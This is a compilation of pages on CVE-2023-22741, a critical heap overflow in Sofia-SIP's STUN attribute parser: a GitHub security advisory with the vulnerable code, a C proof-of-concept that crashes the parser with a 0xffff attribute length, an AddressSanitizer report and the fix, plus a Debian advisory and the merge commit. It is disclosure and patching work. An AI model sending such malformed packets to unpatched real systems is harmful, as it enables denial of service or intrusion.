=== Content from github.com_24da01ec_20250114_201955.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffreeswitch%2Fsofia-sip%2Fsecurity%2Fadvisories%2FGHSA-8599-x7rq-fr54)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffreeswitch%2Fsofia-sip%2Fsecurity%2Fadvisories%2FGHSA-8599-x7rq-fr54)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=freeswitch%2Fsofia-sip)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[freeswitch](/freeswitch)
/
**[sofia-sip](/freeswitch/sofia-sip)**
Public

* [Notifications](/login?return_to=%2Ffreeswitch%2Fsofia-sip) You must be signed in to change notification settings
* [Fork
  188](/login?return_to=%2Ffreeswitch%2Fsofia-sip)
* [Star
   280](/login?return_to=%2Ffreeswitch%2Fsofia-sip)

* [Code](/freeswitch/sofia-sip)
* [Issues
  66](/freeswitch/sofia-sip/issues)
* [Pull requests
  30](/freeswitch/sofia-sip/pulls)
* [Actions](/freeswitch/sofia-sip/actions)
* [Security](/freeswitch/sofia-sip/security)
* [Insights](/freeswitch/sofia-sip/pulse)

Additional navigation options

* [Code](/freeswitch/sofia-sip)
* [Issues](/freeswitch/sofia-sip/issues)
* [Pull requests](/freeswitch/sofia-sip/pulls)
* [Actions](/freeswitch/sofia-sip/actions)
* [Security](/freeswitch/sofia-sip/security)
* [Insights](/freeswitch/sofia-sip/pulse)

# heap-over-flow in stun\_parse\_attribute

Critical

[andywolk](/andywolk)
published
GHSA-8599-x7rq-fr54
Jan 19, 2023

## Package

sofia-sip
(C)

## Affected versions

<= 1.13.10

## Patched versions

1.13.11

## Description

Sofia-SIP **lacks both message length and attributes length checks** when it handles STUN packets, leading to controllable heap-over-flow. Please view the patch below for more details.

For example, in stun\_parse\_attribute() [1], after we get the attribute's type and length value [2], the length will be used directly to copy from the heap, regardless of the message's left size:

```
int stun_parse_attribute(stun_msg_t *msg, unsigned char *p)
{
  int len;
  uint16_t attr_type;
  stun_attr_t *attr, *next;

  attr_type = get16(p, 0); // <-- get from message, controlled by sender, e.g., 0
  len = get16(p, 2);       // <-- get from message, controlled by sender, e.g., 0xffff

  // ......

  switch (attr->attr_type) {
  // ......
  default:
    /* just copy as is */
    attr->pattr = NULL;
    attr->enc_buf.size = len;
    attr->enc_buf.data = (unsigned char *) malloc(len);
    memcpy(attr->enc_buf.data, p, len);  // <-- msg->enc_buf.data - 20 (STUN_HEADER) - 4 (ATTR_HEADER) might be smaller than len, heap-over-flow!
    break;
  }

  // ......
}
```

[1]

[sofia-sip/libsofia-sip-ua/stun/stun\_common.c](https://github.com/freeswitch/sofia-sip/blob/2a6190f8928c44d561efa734fe636fb6e00ab74b/libsofia-sip-ua/stun/stun_common.c#L121)

Line 121
in
[2a6190f](/freeswitch/sofia-sip/commit/2a6190f8928c44d561efa734fe636fb6e00ab74b)

|  | len = get16(p, 2); |
| --- | --- |

[2] <https://www.tech-invite.com/y50/tinv-ietf-rfc-5389-3.html#p-31>
## IMPACT

Since network users control the overflowed length, and the data is written to heap chunks later, attackers may achieve RCE by heap grooming or other exploitation methods.

## BISECT

The bug is introduced 16 years ago:

add sofia-sip 1.12.4 (plus some patches through 12/21/2006) to in tree libs

git-svn-id: [http://svn.freeswitch.org/svn/freeswitch/trunk@3774](http://svn.freeswitch.org/svn/freeswitch/trunk%403774) d0543943-73ff-0310-b7d9-9358b9ac24b2

## REPRODUCTION

stun\_attr\_oob\_poc.c:

```
// libsofia-sip-ua/stun/stun_attr_oob_poc.c
// ./autogen.sh && CFLAGS="-fsanitize=address" LDFLAGS="-fsanitize=address" ./configure && make -j8 && cd libsofia-sip-ua/stun/
// gcc -fsanitize=address stun_attr_oob_poc.c  -I ../.. -I ../su  -I ../url/ -I ../sip/ -I ../stun -o stun_attr_oob_poc ../.libs/libsofia-sip-ua.a -lssl -lcrypto
// ./stun_attr_oob_poc

#include "config.h"
#include "stun_internal.h"
#include <assert.h>
#include <string.h>
#include <stdlib.h>

#define STUN_HEADER_SIZE 20
#define STUN_ATTR_TYPE_SIZE 2
#define STUN_ATTR_LEN_SIZE 2
#define STUN_ATTR_VALUE_SIZE 0

int main(void)
{
    const size_t stun_message_size = STUN_HEADER_SIZE + STUN_ATTR_TYPE_SIZE + STUN_ATTR_LEN_SIZE + STUN_ATTR_VALUE_SIZE;
    unsigned char *stun_message = calloc(1, stun_message_size);
    if (stun_message == NULL)
    {
        perror("Failed to allocate stun_message");
        exit(EXIT_FAILURE);
    }
    stun_message[3] = STUN_ATTR_TYPE_SIZE + STUN_ATTR_LEN_SIZE + STUN_ATTR_VALUE_SIZE; // set STUN
    // stun_message[20][21] attr_type is zero now, not the root cause.
    stun_message[22] = 0xff; stun_message[23] = 0xff; // set Attributes length to MAX 0xffff (STUN_ATTR_VALUE_SIZE is 0 actually)

    stun_msg_t request = {.stun_attr = NULL};
    request.enc_buf.data = stun_message;
    request.enc_buf.size = stun_message_size;

    stun_parse_message(&request); // heap-over-flow

    free(stun_message);

    return 0;
}
```

AddressSanitizer Report:

```
=================================================================
==11181==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000000058 at pc 0x7ff8be6e2397 bp 0x7fff3eab0b90 sp 0x7fff3eab0338
READ of size 65535 at 0x603000000058 thread T0
    #0 0x7ff8be6e2396 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827
    #1 0x56196c557412 in stun_parse_attribute (/home/qiuhao/tmp/sofia-sip/libsofia-sip-ua/stun/stun_attr_oob_poc+0x1b412)
    #2 0x56196c556d4d in stun_parse_message (/home/qiuhao/tmp/sofia-sip/libsofia-sip-ua/stun/stun_attr_oob_poc+0x1ad4d)
    #3 0x56196c556752 in main (/home/qiuhao/tmp/sofia-sip/libsofia-sip-ua/stun/stun_attr_oob_poc+0x1a752)
    #4 0x7ff8bdfc3d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #5 0x7ff8bdfc3e3f in __libc_start_main_impl ../csu/libc-start.c:392
    #6 0x56196c5563c4 in _start (/home/qiuhao/tmp/sofia-sip/libsofia-sip-ua/stun/stun_attr_oob_poc+0x1a3c4)

0x603000000058 is located 0 bytes to the right of 24-byte region [0x603000000040,0x603000000058)
allocated by thread T0 here:
    #0 0x7ff8be75ca37 in __interceptor_calloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:154
    #1 0x56196c556540 in main (/home/qiuhao/tmp/sofia-sip/libsofia-sip-ua/stun/stun_attr_oob_poc+0x1a540)
    #2 0x7ff8bdfc3d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy
Shadow bytes around the buggy address:
  0x0c067fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c067fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c067fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c067fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c067fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c067fff8000: fa fa 00 00 00 fa fa fa 00 00 00[fa]fa fa fa fa
  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c067fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c067fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c067fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==11181==ABORTING

```
## SUPPOSED PATCH

```
From 47ef51ee2512ed9b5e99dbf2a05e0005a60a4e8c Mon Sep 17 00:00:00 2001
From: Qiuhao Li <qiuhao.li@zoom.us>
Date: Tue, 15 Nov 2022 15:00:23 +0800
Subject: [PATCH] stun: add checks for STUN messag len and attr len

Signed-off-by: Qiuhao Li <qiuhao.li@zoom.us>
---
 libsofia-sip-ua/stun/sofia-sip/stun_common.h |  2 +-
 libsofia-sip-ua/stun/stun_common.c           | 19 ++++++++++++++++---
 2 files changed, 17 insertions(+), 4 deletions(-)

diff --git a/libsofia-sip-ua/stun/sofia-sip/stun_common.h b/libsofia-sip-ua/stun/sofia-sip/stun_common.h
index 81f0ebd..32971ec 100644
--- a/libsofia-sip-ua/stun/sofia-sip/stun_common.h
+++ b/libsofia-sip-ua/stun/sofia-sip/stun_common.h
@@ -192,7 +192,7 @@ typedef struct stun_attr_unknownattributes_s{

 /* Common functions */
 int stun_parse_message(stun_msg_t *msg);
-int stun_parse_attribute(stun_msg_t *msg, unsigned char *p);
+int stun_parse_attribute(stun_msg_t *msg, unsigned char *p, size_t left_len);
 int stun_parse_attr_address(stun_attr_t *attr, const unsigned char *p, unsigned len);
 int stun_parse_attr_error_code(stun_attr_t *attr, const unsigned char *p, unsigned len);
 int stun_parse_attr_unknown_attributes(stun_attr_t *attr, const unsigned char *p, unsigned len);
diff --git a/libsofia-sip-ua/stun/stun_common.c b/libsofia-sip-ua/stun/stun_common.c
index 84e1215..46185f4 100644
--- a/libsofia-sip-ua/stun/stun_common.c
+++ b/libsofia-sip-ua/stun/stun_common.c
@@ -87,6 +87,13 @@ int stun_parse_message(stun_msg_t *msg)

   /* parse header first */
   p = msg->enc_buf.data;
+
+  if (get16(p, 2) > (msg->enc_buf.size - 20))
+  {
+    SU_DEBUG_3(("%s: Error STUN Message Length is too big.\n", __func__));
+    return -1;
+  }
+
   msg->stun_hdr.msg_type = get16(p, 0);
   msg->stun_hdr.msg_len = get16(p, 2);
   memcpy(msg->stun_hdr.tran_id, p + 4, STUN_TID_BYTES);
@@ -98,8 +105,8 @@ int stun_parse_message(stun_msg_t *msg)
   len = msg->stun_hdr.msg_len;
   p = msg->enc_buf.data + 20;
   msg->stun_attr = NULL;
-  while (len > 0) {
-    i = stun_parse_attribute(msg, p);
+  while (len >= 4) {  // Type (2) + Length (2) + Value (variable) min attribute size
+    i = stun_parse_attribute(msg, p, len);
     if (i <= 0 || i > len) {
       SU_DEBUG_3(("%s: Error parsing attribute.\n", __func__));
       return -1;
@@ -111,7 +118,7 @@ int stun_parse_message(stun_msg_t *msg)
   return 0;
 }

-int stun_parse_attribute(stun_msg_t *msg, unsigned char *p)
+int stun_parse_attribute(stun_msg_t *msg, unsigned char *p, size_t left_len)
 {
   int len;
   uint16_t attr_type;
@@ -120,6 +127,12 @@ int stun_parse_attribute(stun_msg_t *msg, unsigned char *p)
   attr_type = get16(p, 0);
   len = get16(p, 2);

+  if ((left_len - 4) < len) // make sure we have enough space for attribute
+  {
+    SU_DEBUG_3(("%s: Error STUN attr len is too big.\n", __func__));
+    return -1;
+  }
+
   SU_DEBUG_5(("%s: received attribute: Type %02X, Length %d - %s\n",
              __func__, attr_type, len, stun_attr_phrase(attr_type)));

--
2.34.1
```

This patch has been merged in [#182](https://github.com/freeswitch/sofia-sip/commit/da53e4fbcb138b080a75576dd49c1fff2ada2764).

## CREDIT

Qiuhao Li of Zoom Video Communications, Inc.

### Severity

Critical

### CVE ID

CVE-2023-22741

### Weaknesses

[CWE-122](/advisories?query=cwe%3A122)

### Credits

* [![@QiuhaoLi](https://avatars.githubusercontent.com/u/45557084?s=40&v=4)](/QiuhaoLi)
  [QiuhaoLi](/QiuhaoLi)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.debian.org_bf39302c_20250114_201957.html ===


---

[[Date Prev](msg00100.html)][[Date Next](msg00102.html)]
[[Thread Prev](msg00100.html)][[Thread Next](msg00102.html)]
[[Date Index](maillist.html#00101)]
[[Thread Index](threads.html#00101)]

# [SECURITY] [DSA 5410-1] sofia-sip

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5410-1] sofia-sip
* *From*: Moritz Muehlenhoff <jmm@debian.org>
* *Date*: Wed, 24 May 2023 10:39:40 +0000
* *Message-id*: <[[🔎]](/msgid-search/ZG3pbNKHpeyNFglw%40seger.debian.org) [ZG3pbNKHpeyNFglw@seger.debian.org](msg00101.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5410-1                   security@debian.org
<https://www.debian.org/security/>                       Moritz Muehlenhoff
May 24, 2023                          <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : sofia-sip
CVE ID         : CVE-2022-31001 CVE-2022-31002 CVE-2022-31003 CVE-2022-47516
                 CVE-2023-22741

Multiple security issues were discovered in Sofia-SIP, a SIP User-Agent
library, which could result in denial of service.

For the stable distribution (bullseye), these problems have been fixed in
version 1.12.11+20110422.1-2.1+deb11u1.

We recommend that you upgrade your sofia-sip packages.

For the detailed security status of sofia-sip please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/sofia-sip>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAmRt6GUACgkQEMKTtsN8
TjbdIg/8DBVsizs1Bi1N65zEHRKfQ4wlq01lNnLMcEECsk/nBd44yZQJL1pudEBi
SFmbcF6l4/oeUKvSo5RN1PBe9boVS+tq3ewAUyThZnrywRttFc09Atf3nQyhNaQz
3+1SpqW2k6pTwB2+oilRRDITOorOrQM4hgvYxUhmhNmphNTQtEAbZHXYqAb3NaeK
TWdKCfEdSthj0t4uOADcpS2XpK4jDR6ymjzPaIoenvYKV6JEVCo0qj1mSh7+K23d
mWhV0WoQP2+W0xrZtkDx1SJHPEXfaQ2XXSuBUvyU351XqfWCTxrfBO3h1mlMrkRJ
moSdyP9Pikkrm2bBATDjzl0vEpiWWnAtKaglRCJcBpbnIV7c3l2m61kY8osTZrYl
KacRROyYUwpK8Q39l5i8shfCa4gbS+eZlQNjkFzTE8gpJDAmJi0FG2YEsN3E1u97
9AVnMkWMGe5qEYjybVNwl8OOJ/Ksl/sKsHbQ+s3IzSHwPRpSbHRYXIWTkGtJI3KJ
yyOpmSTdxBKY+YHmqGRhiOON8De+pcIlgn3LrCN92acRtK8vnQstDL+aNCuqUwY7
wNiBrj4/JS4V8SuMn6zBeWDfLcbKYf3BLIsskYb6QuqAIssdNYUzCX4v8UTiiy2Y
uyBY/JDEutSTbn0ygQntur8BGpJiYHat6MffGhsw1knGhimoUkQ=
=q7se
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_92411eaa_20250114_201952.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffreeswitch%2Fsofia-sip%2Fcommit%2Fda53e4fbcb138b080a75576dd49c1fff2ada2764)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffreeswitch%2Fsofia-sip%2Fcommit%2Fda53e4fbcb138b080a75576dd49c1fff2ada2764)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=freeswitch%2Fsofia-sip)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[freeswitch](/freeswitch)
/
**[sofia-sip](/freeswitch/sofia-sip)**
Public

* [Notifications](/login?return_to=%2Ffreeswitch%2Fsofia-sip) You must be signed in to change notification settings
* [Fork
  188](/login?return_to=%2Ffreeswitch%2Fsofia-sip)
* [Star
   280](/login?return_to=%2Ffreeswitch%2Fsofia-sip)

* [Code](/freeswitch/sofia-sip)
* [Issues
  66](/freeswitch/sofia-sip/issues)
* [Pull requests
  30](/freeswitch/sofia-sip/pulls)
* [Actions](/freeswitch/sofia-sip/actions)
* [Security](/freeswitch/sofia-sip/security)
* [Insights](/freeswitch/sofia-sip/pulse)

Additional navigation options

* [Code](/freeswitch/sofia-sip)
* [Issues](/freeswitch/sofia-sip/issues)
* [Pull requests](/freeswitch/sofia-sip/pulls)
* [Actions](/freeswitch/sofia-sip/actions)
* [Security](/freeswitch/sofia-sip/security)
* [Insights](/freeswitch/sofia-sip/pulse)

## Commit

[Permalink](/freeswitch/sofia-sip/commit/da53e4fbcb138b080a75576dd49c1fff2ada2764)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#182](https://github.com/freeswitch/sofia-sip/pull/182) from QiuhaoLi/fix-stun-parser-oob

[Browse files](/freeswitch/sofia-sip/tree/da53e4fbcb138b080a75576dd49c1fff2ada2764)
Browse the repository at this point in the history

```
stun: add checks for STUN messag len and attr len
```

* Loading branch information

[![@andywolk](https://avatars.githubusercontent.com/u/4557407?s=40&v=4)](/andywolk)

[andywolk](/freeswitch/sofia-sip/commits?author=andywolk "View all commits by andywolk")
authored
Dec 27, 2022

2 parents
[2cb3820](/freeswitch/sofia-sip/commit/2cb3820d9fa934f96f318c7cea197f54e8c277c7)
+
[9defd6f](/freeswitch/sofia-sip/commit/9defd6f72dd416ee4fcc1a23cccbb159990da0f6)

commit da53e4f

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**17 additions**
and
**4 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* libsofia-sip-ua/stun

  + sofia-sip

    - libsofia-sip-ua/stun/sofia-sip/stun\_common.h
      [stun\_common.h](#diff-04e81968a2a412fa80e38e1d06976b7876770bc9eb635d0d736441bdecf8ac09)
  + libsofia-sip-ua/stun/stun\_common.c
    [stun\_common.c](#diff-05b6416f7dfa1da919a2fd22877a724dd04270e5fa29c3a64cb2e7f60a53c2a0)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[libsofia-sip-ua/stun/sofia-sip/stun\_common.h](#diff-04e81968a2a412fa80e38e1d06976b7876770bc9eb635d0d736441bdecf8ac09 "libsofia-sip-ua/stun/sofia-sip/stun_common.h")

Show comments

[View file](/freeswitch/sofia-sip/blob/da53e4fbcb138b080a75576dd49c1fff2ada2764/libsofia-sip-ua/stun/sofia-sip/stun_common.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -192,7 +192,7 @@ typedef struct stun\_attr\_unknownattributes\_s{ |
|  |  |  |
|  |  | /\* Common functions \*/ |
|  |  | int stun\_parse\_message(stun\_msg\_t \*msg); |
|  |  | int stun\_parse\_attribute(stun\_msg\_t \*msg, unsigned char \*p); |
|  |  | int stun\_parse\_attribute(stun\_msg\_t \*msg, unsigned char \*p, size\_t left\_len); |
|  |  | int stun\_parse\_attr\_address(stun\_attr\_t \*attr, const unsigned char \*p, unsigned len); |
|  |  | int stun\_parse\_attr\_error\_code(stun\_attr\_t \*attr, const unsigned char \*p, unsigned len); |
|  |  | int stun\_parse\_attr\_unknown\_attributes(stun\_attr\_t \*attr, const unsigned char \*p, unsigned len); |
| Expand Down | |  |

19 changes: 16 additions & 3 deletions

19
[libsofia-sip-ua/stun/stun\_common.c](#diff-05b6416f7dfa1da919a2fd22877a724dd04270e5fa29c3a64cb2e7f60a53c2a0 "libsofia-sip-ua/stun/stun_common.c")

Show comments

[View file](/freeswitch/sofia-sip/blob/da53e4fbcb138b080a75576dd49c1fff2ada2764/libsofia-sip-ua/stun/stun_common.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -87,6 +87,13 @@ int stun\_parse\_message(stun\_msg\_t \*msg) |
|  |  |  |
|  |  | /\* parse header first \*/ |
|  |  | p = msg->enc\_buf.data; |
|  |  |  |
|  |  | if (get16(p, 2) > (msg->enc\_buf.size - 20)) |
|  |  | { |
|  |  | SU\_DEBUG\_3(("%s: Error STUN Message Length is too big.\n", \_\_func\_\_)); |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | msg->stun\_hdr.msg\_type = get16(p, 0); |
|  |  | msg->stun\_hdr.msg\_len = get16(p, 2); |
|  |  | memcpy(msg->stun\_hdr.tran\_id, p + 4, STUN\_TID\_BYTES); |
| Expand All | | @@ -98,8 +105,8 @@ int stun\_parse\_message(stun\_msg\_t \*msg) |
|  |  | len = msg->stun\_hdr.msg\_len; |
|  |  | p = msg->enc\_buf.data + 20; |
|  |  | msg->stun\_attr = NULL; |
|  |  | while (len > 0) { |
|  |  | i = stun\_parse\_attribute(msg, p); |
|  |  | while (len >= 4) { // Type (2) + Length (2) + Value (variable) min attribute size |
|  |  | i = stun\_parse\_attribute(msg, p, len); |
|  |  | if (i <= 0 || i > len) { |
|  |  | SU\_DEBUG\_3(("%s: Error parsing attribute.\n", \_\_func\_\_)); |
|  |  | return -1; |
| Expand All | | @@ -111,7 +118,7 @@ int stun\_parse\_message(stun\_msg\_t \*msg) |
|  |  | return 0; |
|  |  | } |
|  |  |  |
|  |  | int stun\_parse\_attribute(stun\_msg\_t \*msg, unsigned char \*p) |
|  |  | int stun\_parse\_attribute(stun\_msg\_t \*msg, unsigned char \*p, size\_t left\_len) |
|  |  | { |
|  |  | int len; |
|  |  | uint16\_t attr\_type; |
| Expand All | | @@ -120,6 +127,12 @@ int stun\_parse\_attribute(stun\_msg\_t \*msg, unsigned char \*p) |
|  |  | attr\_type = get16(p, 0); |
|  |  | len = get16(p, 2); |
|  |  |  |
|  |  | if ((left\_len - 4) < len) // make sure we have enough space for attribute |
|  |  | { |
|  |  | SU\_DEBUG\_3(("%s: Error STUN attr len is too big.\n", \_\_func\_\_)); |
|  |  | return -1; |
|  |  | } |
|  |  |  |
|  |  | SU\_DEBUG\_5(("%s: received attribute: Type %02X, Length %d - %s\n", |
|  |  | \_\_func\_\_, attr\_type, len, stun\_attr\_phrase(attr\_type))); |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `da53e4f`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffreeswitch%2Fsofia-sip%2Fcommit%2Fda53e4fbcb138b080a75576dd49c1fff2ada2764) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
